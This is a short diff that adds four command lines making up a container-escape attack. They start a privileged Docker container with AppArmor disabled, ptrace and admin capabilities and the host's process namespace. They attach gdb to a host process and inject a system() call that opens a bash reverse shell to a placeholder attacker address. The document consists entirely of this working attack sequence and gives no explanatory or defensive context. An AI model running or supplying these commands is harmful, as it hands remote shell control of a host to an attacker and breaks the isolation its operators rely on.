@@ -1,0 +1,4 @@
+sudo docker run --security-opt=apparmor:unconfined --cap-add=SYS_PTRACE --cap-add=SYS_ADMIN --pid=host -it ubuntu bash
+# ps -ef
+# gdb -p <pid>
+# call (void)system("bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'")
